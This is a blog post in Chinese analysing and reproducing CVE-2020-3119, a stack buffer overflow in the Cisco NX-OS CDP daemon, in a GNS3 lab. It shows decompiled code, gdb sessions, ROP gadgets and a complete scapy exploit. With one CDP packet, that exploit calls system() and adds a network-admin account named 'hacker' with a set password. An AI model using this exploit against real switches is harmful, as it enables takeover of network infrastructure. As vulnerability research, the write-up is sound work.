<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CVE-2020-3119 分析与调试 | Ainevsia Blog</title>
<meta name="keywords" content="">
<meta name="description" content="漏洞介绍
CVE-2020-3119是Armis Labs在2020年2月5日公开的一个Cisco CDP协议的缓冲区溢出漏洞，成功利用的情况下可以远程执行代码。
漏洞发生在Cisco NX-OS上，NX-OS是思科自研的网络设备操作系统，基于Linux内核（Wind River Linux）开发，运行在在思科的Nexus系列数据中心以太网交换机上。本次漏洞影响到Nexus 3000和Nexus 9000系列的所有交换机。">
<meta name="author" content="">
<link rel="canonical" href="https://ainevsia.github.io/post/cve-2020-3119/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.bf5f9f73cf17311d52cedbcda82c922e91b2f566d88a85ad9f5b5a08b586bd5f.css" integrity="sha256-v1&#43;fc88XMR1SztvNqCySLpGy9WbYioWtn1taCLWGvV8=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.acb54fd32bbc1982428b8850317e45d076b95012730a5936667e6bc21777692a.js" integrity="sha256-rLVP0yu8GYJCi4hQMX5F0Ha5UBJzClk2Zn5rwhd3aSo="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://ainevsia.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://ainevsia.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://ainevsia.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://ainevsia.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://ainevsia.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="CVE-2020-3119 分析与调试" />
<meta property="og:description" content="漏洞介绍
CVE-2020-3119是Armis Labs在2020年2月5日公开的一个Cisco CDP协议的缓冲区溢出漏洞，成功利用的情况下可以远程执行代码。
漏洞发生在Cisco NX-OS上，NX-OS是思科自研的网络设备操作系统，基于Linux内核（Wind River Linux）开发，运行在在思科的Nexus系列数据中心以太网交换机上。本次漏洞影响到Nexus 3000和Nexus 9000系列的所有交换机。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://ainevsia.github.io/post/cve-2020-3119/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2021-03-12T18:18:49+08:00" />
<meta property="article:modified_time" content="2021-03-12T18:18:49+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CVE-2020-3119 分析与调试"/>
<meta name="twitter:description" content="漏洞介绍
CVE-2020-3119是Armis Labs在2020年2月5日公开的一个Cisco CDP协议的缓冲区溢出漏洞，成功利用的情况下可以远程执行代码。
漏洞发生在Cisco NX-OS上，NX-OS是思科自研的网络设备操作系统，基于Linux内核（Wind River Linux）开发，运行在在思科的Nexus系列数据中心以太网交换机上。本次漏洞影响到Nexus 3000和Nexus 9000系列的所有交换机。"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://ainevsia.github.io/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CVE-2020-3119 分析与调试",
      "item": "https://ainevsia.github.io/post/cve-2020-3119/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CVE-2020-3119 分析与调试",
  "name": "CVE-2020-3119 分析与调试",
  "description": "漏洞介绍 CVE-2020-3119是Armis Labs在2020年2月5日公开的一个Cisco CDP协议的缓冲区溢出漏洞，成功利用的情况下可以远程执行代码。\n漏洞发生在Cisco NX-OS上，NX-OS是思科自研的网络设备操作系统，基于Linux内核（Wind River Linux）开发，运行在在思科的Nexus系列数据中心以太网交换机上。本次漏洞影响到Nexus 3000和Nexus 9000系列的所有交换机。\n",
  "keywords": [
    
  ],
  "articleBody": "漏洞介绍 CVE-2020-3119是Armis Labs在2020年2月5日公开的一个Cisco CDP协议的缓冲区溢出漏洞，成功利用的情况下可以远程执行代码。\n漏洞发生在Cisco NX-OS上，NX-OS是思科自研的网络设备操作系统，基于Linux内核（Wind River Linux）开发，运行在在思科的Nexus系列数据中心以太网交换机上。本次漏洞影响到Nexus 3000和Nexus 9000系列的所有交换机。\n在我着手进行分析之前，知道创宇404实验室的Hcamael师傅已经写了一篇该漏洞的分析文章，对该漏洞进行了深入的分析，本文的所有内容都是建立在这篇分析文章的基础上。\nCDP协议是思科专用的设备发现协议，能够运行在大部分的思科设备上面，思科设备能够在与它们直连的设备之间分享有关操作系统软件版本、IP地址、硬件平台等相关信息，是工作在链路层（二层）的协议。该协议的目的MAC地址固定，为01-00-0c-cc-cc-cc，与CDP共用这一地址的还有其他的一些协议。\n根据Armis Labs的研究，经过路由器的所有二层网络报文首先都会被l2fwdr进程解析，再去除物理层报文的一些基础分装后通过mts_queue分发给各个处理不同协议的进程。本次漏洞是CDP的协议，所以我们要具体进行分析的程序是cdpd这个守护进程。\ncdpd的二进制文件虽然自己不带符号信息，但是程序在运行的时候打了大量的log，详细到每进行一个操作就会有对应的日志记录函数，从这些日志中可以轻松恢复出绝大部分的函数名。如下面这个函数的截图所示，可以从函数日志中恢复出该函数的函数名为cdpd_get_domainname。（但是在逆向分析的过程中会发现有些重要的宏函数或者是inline函数被编译之后嵌入到了其他的函数体当中了。）\n根据Armis Labs发布的漏洞分析，找到了该漏洞存在于cdpd_poe_handle_pwr_tlvs函数，相关的漏洞代码如下（截取有关片段）：\nchar __cdecl cdpd_poe_handle_pwr_tlvs(int *a1, int a2, struct pwr_req *pwr_pkt_2) { ... int temp[16]; ... if ( a2 || pwr_pkt_2 ) { // CDP Version 2 ... if ( pwr_pkt_2 ) { length = __ROR2__(pwr_pkt_2-\u003elength, 8); // big-endian to small-endian req_id = __ROR2__(pwr_pkt_2-\u003erequest_id, 8); mgmt_id = __ROR2__(pwr_pkt_2-\u003emanagement_id, 8); ... off_lst_start = length - 8; num_levels = (unsigned int)off_lst_start \u003e\u003e 2;// divied sizeof(int) = / 4 ... if ( num_levels ) { current_offset = pwr_pkt_2-\u003epower_requested; counter = 1; do { pwr_levels_requested = counter - 1; temp[counter - 1] = *current_offset; ... a1[counter + 310] = large_buff[counter + 254]; // a1 dereferenced ++current_offset; ++counter; } while ( counter != num_levels + 1 ); } ... } } } cdpd_poe_handle_pwr_tlvs函数的第三个参数pwr_pkt_2是一个指向cdp报文中Power Request开始的一个结构体指针，下图中就是指向0x9aPower Request开始的地方。同时我们也可以用wireshark了解到每一个字段的长度，type字段占用两个字节（0x0019），Length字段占用两个字节（0x84=132），request-id和managem-id都占用2个字节（0x6161=24929），然后就是每个长度4字节的Power Request数组。\n在IDA中定义这个结构体相应的成员。\ncdpd_poe_handle_pwr_tlvs函数在第一个if分支处理Version 1的情况，然后进入第二个分支处理Version 2的情况，然后在pwr_pkt_2指针不为空的情况下，将报文中length、req_id、mgmt_id三个字段从网络字节序转换成主机字节序，然后计算Power Request数组的长度off_lst_start，利用off_lst_start除以4的方法得到这个数组元素的个数num_levels。此时num_levels使用cdp报文中的length字段计算得到的，也就是说，是用户可控的。\n然后进入一个num_levels次的循环，每次循环会将pwr_pkt_2中的一个int的数据拷贝到本地的数组temp中。\n点击temp变量可以看到其在栈中相对当前函数栈底的位置，它正好是这个函数最底部的变量，并且没有启用栈cookie，距离保存的ebp的偏移是0x40也就是16个int变量的距离（0x4 / 4 = 0x10）。\n由于没有对Power Request的个数进行检查，所以我们可以轻松地构造Power Request个数超过16的CDP报文，在填充16个int的padding之后就可以覆盖到ebp、返回地址以及之后的值。\n环境搭建 环境搭建可能是整个漏洞复现过程中最麻烦的一个步骤，其中的坑比漏洞利用本身还要多，笔者试着将自己遇到的一些坑记录一下。\n使用GNS3模拟器可以对Cisco NX-OSv 9000交换机进行全系统模拟，其实质是使用qemu进行虚拟化。笔者实验使用的GNS3版本为2.2.17，截至本文写作之时GNS3版本已升级至2.2.17，不过GNS3的版本不同应该不会有什么问题。GNS3安装本身遇到问题的话可以参见这篇教程。\n接下的一件事是下载固件，由于我一开始对Cisco的产品线没有什么了解，固件的格式也分不清楚，导致下载了两次都发现下载错了，和GNS3所要求使用的固件不匹配。GNS3是支持Cisco NX-OS 9000的模拟的，但是这个被模拟系统有一个另外的名字：Cisco NX-OSv 9000，NX OSv 9000是一个虚拟平台，旨在模拟运行Cisco Nexus 9000操作系统的网络设备。尽管没有实现特定的硬件仿真，但是NX OSv 9000和Cisco Nexus 9000上运行的软件是一模一样的。具体的介绍可以查阅官网。\n所以说，不是Cisco官网上提供的所有固件下载下来都是可以用GNS3跑的，必须要下载它指定的系统镜像，如下图所示，我们要下载nxosv-final.9.2.3.qcow2这个文件，OVMF-20160813.fd是GNS3自带的一个文件：\n下载得到固件之后将固件导入到GNS3中创建模板，创建的时候默认的一些模板参数不要改动，特别是内存默认是8G的不要改小了，小于8G的话系统就跑不起来了。\n在网络拓扑方面我直接将本机的WLAN端口和交换机的e1/1端口相连，在物理机编写好exp后可以直接发送给交换机。\n在官网的教程里有这么一段话：\n需要照做，不然确实再次启动就起不来了。\n系统的的启动是很慢的，需要等不少时间。等看到login prompt后输入admin和密码就可以登录了。（中间一大段是系统log）\n进入Cisco的shell之后run bash即可拿到一个bash，再su输入admin的密码即可拿到rootshell。\n环境到此就算搭建完成了，有了root shell也可以用gdb调试任意的进程了，接下来介绍漏洞利用的思路。\n漏洞利用 scapy构造CDP报文 使用scapy可以构造CDP包，从Hcamael师傅的分析文章中截取一段模板如下：\nfrom scapy.contrib import cdp from scapy.all import Ether, LLC, SNAP l2_packet = Ether(dst=\"01:00:0c:cc:cc:cc\") # Logical-Link Control l2_packet /= LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / SNAP() # Cisco Discovery Protocol cdp_v2 = cdp.CDPv2_HDR(vers=2, ttl=180) deviceid = cdp.CDPMsgDeviceID(val='nxos922(97RROM91ST3)') portid = cdp.CDPMsgPortID(iface=b\"ens38\") address = cdp.CDPMsgAddr(naddr=1, addr=cdp.CDPAddrRecordIPv4(addr=\"192.168.1.3\")) cap = cdp.CDPMsgCapabilities(cap=1) cdp_packet = cdp_v2/deviceid/portid/address/cap packet = l2_packet / cdp_packet sendp(packet) 漏洞利用的思路比较明确，由于不存在栈canary但是有ASLR和NX，溢出后可以ROP至libc段或其他可执行段去执行system函数。\n在实际测试中，libc的基址只有一个字节会发生变化。这是由于32位ASLR的是整体在一个随机的基址上进行一个整体的偏移的。所以即便面对ASLR我们也可以通过爆破一个字节来获取一个确定的libc基址，具体的原理参见Stack Overflow上的一个回答。\n0xf5def000 0xf5fa0000 0x1b1000 0x0 /lib/libc-2.22.so 0xf5dda000 0xf5f8b000 0x1b1000 0x0 /lib/libc-2.22.so 0xf5dfe000 0xf5faf000 0x1b1000 0x0 /lib/libc-2.22.so 0xf5d84000 0xf5f35000 0x1b1000 0x0 /lib/libc-2.22.so 0xf5e12000 0xf5fc3000 0x1b1000 0x0 /lib/libc-2.22.so 返回之前的约束 利用的过程中有两个地方需要注意：\n第一个是我们在覆盖了eip之后紧接着就会覆盖到第一个参数a1的值，但是a1在程序返回之前还会被解引用，并且a1的周围还会被写入数据，所以a1必须覆盖成一个可写的指针。\n还有第二个地方需要注意的是在溢出操作之后必须要尽可能快的让函数执行到返回的地方，但是在溢出点之后执行流可能会进入到cdpd_send_pwr_req_to_poed函数中，该函数会调用__memcpy_to_buf限制了Power Requested的长度在40字节以内，导致溢出失败。为了不进入这个函数，我们必须要使得下面这个if条件判断为真，进入该分支不会执行到cdpd_send_pwr_req_to_poed函数中，并且能够顺利地执行到函数返回。\nv6 = *((_WORD *)a1 + 604); v7 = *((_WORD *)a1 + 602); v8 = a1[303]; if ( req_id == v6 \u0026\u0026 mgmt_id == v7 ) 由于此时a1已经被覆盖，a1的值已经是我们所控制的值，所以结合上面的这两个约束条件，我们可以在内存中找一片可写的内存，并且该内存周围全是空值，然后设置req_id和mgmt_id也为控制，便可以满足这两个约束条件。\nROP链的构造 由于libc的基址我们已经假设爆破得到了，在该libc中寻找可以进行system的ROP链就是利用的最后一步。\n这里值得提的一点是该漏洞是没有交互的，一个CDP报文发送过去之后就没有然后了，没有输入，也没有输出，所有的payload都是在一个cdp包内发送的，payload的目的也不是去执行system(\"/bin/sh\")，而是要选择其他的命令，这里介绍两种：\n第一种，可以执行反连shell的代码。\n第二种，可以添加一个管理员账号，比如执行如下命令：/isan/bin/vsh -c \"configure terminal ; username hacker password qweASD123 role network-admin\"\n我们选择第二种方法，那么最后一个问题是，这个system的参数，如何传递？\n很巧的是，在溢出之后的栈上残留了一个指针，下面的例子中是0x100a883a这个指针，这个指针指向了cdp报文中的DeviceID开始的地方，于是我们可以利用这个指针在DeviceID中写入我们要执行的命令来进行system参数的传递。\n但是美中不足的是DeviceID字段开头必须是固定的一个整数表示type，也就是说如果直接使用这个指针作为参数那么system的参数一定是以0x0001开头的，这是不能利用的，所以我们不得不对这个指针向后移动，至少移动4字节，指向我们所控制的数据区内。\n(gdb) x/240xb 0x100a890a - 234 0x100a8820 : 0x01 0x00 0x0c 0xcc 0xcc 0xcc 0xc8 0x21 0x100a8828 : 0x58 0x68 0xcf 0x22 0x00 0xe2 0xaa 0xaa 0x100a8830 : 0x03 0x00 0x00 0x0c 0x20 0x00 0x02 0xb4 0x100a8838 : 0x19 0x15 0x00 0x01 0x00 0x60 0x2f 0x69 0x100a8840 : 0x73 0x61 0x6e 0x2f 0x62 0x69 0x6e 0x2f 0x100a8848 : 0x76 0x73 0x68 0x20 0x2d 0x63 0x20 0x22 0x100a8850 : 0x63 0x6f 0x6e 0x66 0x69 0x67 0x75 0x72 0x100a8858 : 0x65 0x20 0x74 0x65 0x72 0x6d 0x69 0x6e (gdb) x/40xw $esp 0xffffc9cc: 0x64646464 0xf680965c(1st) 0x65656565 0x65656565 0xffffc9dc: 0x65656565 0x0000001a 0xffffca38 0x1008ac10 0xffffc9ec: 0x1009f798 0xffffca3c(mov_pop_edi_ret) 0xffffca58(edi) 0xffffceb8 (add_eax_0xc_ret) 0xffffc9fc: 0x1002e8b8(push_eax_call_edi) 0x100a883a 0x00b40000 0x100a891a 上面这是函数返回时内存的一个情况，0xffffc9cc指向被劫持的eip。\n所以我们就在libc寻找可以利用的gadget，找到如下gadget：\nret = base + 0x000003f3 # 0x000003f3 : ret pop_edi_ret = base + 0x0001764b # 0x0001764b : pop edi ; ret pop_eax_ret = base + 0x00021b07 # 0x00021b07 : pop eax ; ret mov_pop_edi_ret = base + 0x001434c2 # 0x001434c2 : mov eax, dword ptr [esp + 0xc] ; pop edi ; ret add_eax_0xc_ret = base + 0x0010385a # 0x0010385a : add eax, 0xc ; ret push_eax_call_edi = base + 0x0001cb19 # 0x0001cb19 : push eax ; call edi 最后构造ROP链。\n模拟器调试 首先关闭系统的ASLR\nswitch# run bash bash-4.3$ su Password: bash-4.3# id uid=0(root) gid=0(root) groups=0(root) bash-4.3# ps aux | grep cdpd root 1650 0.0 0.0 5944 1776 ttyS0 S+ 01:28 0:00 grep cdpd root 27967 0.1 0.8 832896 72008 ? Ss 01:20 0:00 /isan/bin/cdpd bash-4.3# cat /proc/sys/kernel/randomize_va_space 2 bash-4.3# echo 0 | tee /proc/sys/kernel/randomize_va_space 0 bash-4.3# cat /proc/sys/kernel/randomize_va_space 0 然后先用exp打一次，这个时候的cdpd是开了ASLR的，所以会崩溃，崩溃之后重启的cdpd就是没有开ASLR的了。\nbash-4.3# 2021 Mar 15 01:30:34 switch %$ VDC-1 %$ %SYSMGR-2-SERVICE_CRASHED: Service \"cdp\" (PID 27967) hasn't caught signal 11 (core will be saved). 使用gdb attach挂载到cdpd进程上，在cdpd_poe_handle_pwr_tlvs函数ret的地方下断点，然后继续调试，同时用exp再打一遍。\nbash-4.3# ps aux | grep cdpd root 1890 1.6 0.8 835100 70452 ? Ss 01:30 0:00 /isan/bin/cdpd root 2519 0.0 0.0 5944 1760 ttyS0 S+ 01:31 0:00 grep cdpd bash-4.3# gdb /isan/bin/cdpd -p 1890 GNU gdb (GDB) 7.10.1 Copyright (C) 2015 Free Software Foundation, Inc. Reading symbols from /isan/bin/cdpd...(no debugging symbols found)...done. Attaching to program: /isan/bin/cdpd, process 1890 Reading symbols from /usr/lib/libssl.so.1.0.0...(no debugging symbols found)...done. ...... Reading symbols from /isan/lib/libigmp_dll.so...(no debugging symbols found)...done. 0xf7fd8c30 in __kernel_vsyscall () (gdb) info proc mappings process 1890 Mapped address spaces: Start Addr End Addr Size Offset objfile 0x10000000 0x1009f000 0x9f000 0x0 /isan/bin/cdpd 0x1009f000 0x100a1000 0x2000 0x9f000 /isan/bin/cdpd 0x100a1000 0x103b4000 0x313000 0x0 [heap] (gdb) b *(0x369EF+0x10000000) Breakpoint 1 at 0x100369ef (gdb) c Continuing. 这次gdb就会在cdpd_poe_handle_pwr_tlvs函数返回的时候停下来，观察溢出后的栈的情况：\nBreakpoint 1, 0x100369ef in cdpd_poe_handle_pwr_tlvs () (gdb) (gdb) x/40xw $esp 0xffffc9cc: 0xf666b64b 0xf680965c 0xf66543f3 0xf66543f3 0xffffc9dc: 0xf66543f3 0xf66543f3 0xf66543f3 0xf66543f3 0xffffc9ec: 0xf66543f3 0xf67974c2 0xf6690790 0xf675785a 0xffffc9fc: 0xf6670b19 0x100a883a 0x00b40000 0x100a8944 0xffffca0c: 0x100a88c4 0x103447cc 0x10345ecc 0x01140201 0xffffca1c: 0x00000000 0x00000006 0x10110b0c 0x100a894a 0xffffca2c: 0xffff0006 0xf7fe79fb 0xf692926c 0x31313131 0xffffca3c: 0x6f662020 0x20646e75 0x20727750 0x736e6f43 0xffffca4c: 0x564c5420 0x3020000a 0x202c3378 0x695f6669 0xffffca5c: 0x7865646e 0x78305b3a 0x30306131 0x30303030 (gdb) x/2i 0xf666b64b 0xf666b64b \u003c__libgcc_s_init+139\u003e: pop %edi 0xf666b64c \u003c__libgcc_s_init+140\u003e: ret (gdb) x/i 0xf66543f3 0xf66543f3: ret (gdb) x/3i 0xf67974c2 0xf67974c2 \u003c__strnlen_sse2+962\u003e: mov 0xc(%esp),%eax 0xf67974c6 \u003c__strnlen_sse2+966\u003e: pop %edi 0xf67974c7 \u003c__strnlen_sse2+967\u003e: ret (gdb) x/2i 0xf675785a 0xf675785a : add $0xc,%eax 0xf675785d : ret (gdb) x/2i 0xf6670b19 0xf6670b19 \u003c__gconv_transform_ascii_internal+201\u003e: push %eax 0xf6670b1a \u003c__gconv_transform_ascii_internal+202\u003e: call *%edi (gdb) x/i 0xf6690790 0xf6690790 \u003c__libc_system\u003e: sub $0xc,%esp (gdb) x/3s 0x100a883a 0x100a883a : \"\" 0x100a883b : \"\\001\" 0x100a883d : \"jxxxxxxxx/isan/bin/vsh -c \\\"configure terminal ; username hacker password qweASD123 role network-admin\\\"\" 0xf680965c这个指针位于a1的位置，也就是第一个参数，是我随机选择的指向libc数据段的一个指针，它的周围都是0，满足上述的那些条件，随后用0xf66543f3处单条的ret语句调整esp的位置靠近我们想要的指针0x100a883a，然后通过\nmov 0xc(%esp),%eax pop %edi add $0xc,%eax push %eax call *%edi 这5条指令实现system(\"/isan/bin/vsh -c \\\"configure terminal ; username hacker password qweASD123 role network-admin\\\"\")的效果。\n完整exp from scapy.contrib import cdp from scapy.all import Dot3, LLC, SNAP, sendp import time ethernet = Dot3(dst=\"01:00:0c:cc:cc:cc\") llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / SNAP() cdp_header = cdp.CDPv2_HDR(vers=2, ttl=180) # deviceid = cdp.CDPMsgDeviceID(val='nxos922(97RROM91ST3)') cmd = 'x' * (0xc - 4) cmd += '/isan/bin/vsh -c \"configure terminal ; username hacker password qweASD123 role network-admin\"' cmd += '\\x00' deviceid = cdp.CDPMsgDeviceID(val=cmd) portid = cdp.CDPMsgPortID(iface=\"br0\") address = cdp.CDPMsgAddr(naddr=1, addr=cdp.CDPAddrRecordIPv4(addr=\"192.168.110.130\")) cap = cdp.CDPMsgCapabilities(cap=1) base = 0xf6654000 system = base + 0x3C790 ret = base + 0x000003f3 # 0x000003f3 : ret pop_edi_ret = base + 0x0001764b # 0x0001764b : pop edi ; ret pop_eax_ret = base + 0x00021b07 # 0x00021b07 : pop eax ; ret mov_pop_edi_ret = base + 0x001434c2 # 0x001434c2 : mov eax, dword ptr [esp + 0xc] ; pop edi ; ret add_eax_0xc_ret = base + 0x0010385a # 0x0010385a : add eax, 0xc ; ret push_eax_call_edi = base + 0x0001cb19 # 0x0001cb19 : push eax ; call edi padding = b\"\\x00\" * 4 # Requist-ID: 0x0000, Management-ID: 0x0000 padding += b\"bbbb\" * 16 # Power Request Entry x 16 padding += b\"cccc\" # placeholder for saved ebp payload = padding payload += pop_edi_ret.to_bytes(4, 'big') # pop out next unused parameter a1 payload += (0xf6809b10 - 1204).to_bytes(4, 'big') # 1st parameter : a1 payload += ret.to_bytes(4, 'big') * 7 # adjust the stack payload += mov_pop_edi_ret.to_bytes(4, 'big') # mov eax, dword ptr [esp + 0xc] ; pop edi ; ret payload += system.to_bytes(4, 'big') # addr(system) into edi payload += add_eax_0xc_ret.to_bytes(4, 'big') # add eax, 0xc ; ret payload += push_eax_call_edi.to_bytes(4, 'big') # shoot power_req = cdp.CDPMsgUnknown19(val=payload) power_level = cdp.CDPMsgPower(power=16) cdp_packet = cdp_header/deviceid/portid/address/cap/power_req/power_level # print('[+] try 256 times to see if we success ...') # for i in range(0x100): # print('\\r[*] sending packet {} / 256'.format(i + 1),end='') # sendp(ethernet/llc/cdp_packet) # time.sleep(0.5) print('This payload exploit CVE-2020-3119 to gain RCE and add an administrator account') print('username/pw: hacker/qweASD123') print('we cannot determine whether our payload success or not in one shot') print('because there is no interactive') print('in reality, aslr is enabled, so we must try 256 times') print('here demonstrate the situation without ASLR: we only need to send one packet') sendp(ethernet/llc/cdp_packet) print('[+] done !') 效果演示 总结与感想 GNS3模拟器会不时地突然重启，比较迷惑，暂时认为是模拟器不稳定的问题。 ",
  "wordCount" : "1225",
  "inLanguage": "en",
  "datePublished": "2021-03-12T18:18:49+08:00",
  "dateModified": "2021-03-12T18:18:49+08:00",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://ainevsia.github.io/post/cve-2020-3119/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Ainevsia Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://ainevsia.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://ainevsia.github.io/" accesskey="h" title="Ainevsia Blog (Alt + H)">Ainevsia Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title">
      CVE-2020-3119 分析与调试
    </h1>
    <div class="post-meta"><span title='2021-03-12 18:18:49 +0800 CST'>March 12, 2021</span>

</div>
  </header> 
  <div class="post-content"><h1 id="漏洞介绍">漏洞介绍<a hidden class="anchor" aria-hidden="true" href="#漏洞介绍">#</a></h1>
<p><code>CVE-2020-3119</code>是<code>Armis Labs</code>在2020年2月5日公开的一个Cisco CDP协议的<strong>缓冲区溢出</strong>漏洞，成功利用的情况下可以远程执行代码。</p>
<p>漏洞发生在Cisco NX-OS上，<a href="https://www.ruilong-edu.com/what-exactly-is-cisco-nx-os-operating-system-how-it-differs-from-ios-a-quick-intro/">NX-OS</a>是思科自研的网络设备操作系统，基于Linux内核（Wind River Linux）开发，运行在在思科的Nexus系列数据中心以太网交换机上。本次漏洞影响到Nexus 3000和Nexus 9000系列的所有交换机。</p>
<p>在我着手进行分析之前，知道创宇404实验室的Hcamael师傅已经写了一篇该漏洞的<a href="https://blog.knownsec.com/2020/07/cve-2020-3119-cisco-cdp-%E5%8D%8F%E8%AE%AE%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">分析文章</a>，对该漏洞进行了深入的分析，本文的所有内容都是建立在这篇分析文章的基础上。</p>
<p><a href="https://baike.baidu.com/item/CDP/17666953">CDP协议</a>是思科专用的设备发现协议，能够运行在大部分的思科设备上面，思科设备能够在与它们直连的设备之间分享有关操作系统软件版本、IP地址、硬件平台等相关信息，是工作在链路层（二层）的协议。该协议的目的MAC地址固定，为<code>01-00-0c-cc-cc-cc</code>，与CDP共用这一地址的还有其他的一些协议。</p>
<p><img loading="lazy" src="https://res.cloudinary.com/dx9uhkbv5/image/upload/v1691992442/blog/CVE-2020-3119/l2_yrul6s.png" alt=""  />
</p>
<p>根据<code>Armis Labs</code>的研究，经过路由器的所有二层网络报文首先都会被<code>l2fwdr</code>进程解析，再去除物理层报文的一些基础分装后通过<code>mts_queue</code>分发给各个处理不同协议的进程。本次漏洞是CDP的协议，所以我们要具体进行分析的程序是<code>cdpd</code>这个守护进程。</p>
<p>cdpd的二进制文件虽然自己不带符号信息，但是程序在运行的时候打了大量的log，详细到每进行一个操作就会有对应的日志记录函数，从这些日志中可以轻松恢复出绝大部分的函数名。如下面这个函数的截图所示，可以从函数日志中恢复出该函数的函数名为<code>cdpd_get_domainname</code>。（但是在逆向分析的过程中会发现有些重要的宏函数或者是inline函数被编译之后嵌入到了其他的函数体当中了。）</p>
<p><img loading="lazy" src="https://res.cloudinary.com/dx9uhkbv5/image/upload/v1691992442/blog/CVE-2020-3119/comment_git9zi.png" alt=""  />
</p>
<p>根据<code>Armis Labs</code>发布的漏洞分析，找到了该漏洞存在于<code>cdpd_poe_handle_pwr_tlvs</code>函数，相关的漏洞代码如下（截取有关片段）：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">cdpd_poe_handle_pwr_tlvs</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>a1, <span style="color:#66d9ef">int</span> a2, <span style="color:#66d9ef">struct</span> pwr_req <span style="color:#f92672">*</span>pwr_pkt_2) {
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> temp[<span style="color:#ae81ff">16</span>];
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( a2 <span style="color:#f92672">||</span> pwr_pkt_2 ) {  <span style="color:#75715e">// CDP Version 2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        ...
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( pwr_pkt_2 ) {
</span></span><span style="display:flex;"><span>            length <span style="color:#f92672">=</span> <span style="color:#a6e22e">__ROR2__</span>(pwr_pkt_2<span style="color:#f92672">-&gt;</span>length, <span style="color:#ae81ff">8</span>);  <span style="color:#75715e">// big-endian to small-endian
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            req_id <span style="color:#f92672">=</span> <span style="color:#a6e22e">__ROR2__</span>(pwr_pkt_2<span style="color:#f92672">-&gt;</span>request_id, <span style="color:#ae81ff">8</span>);
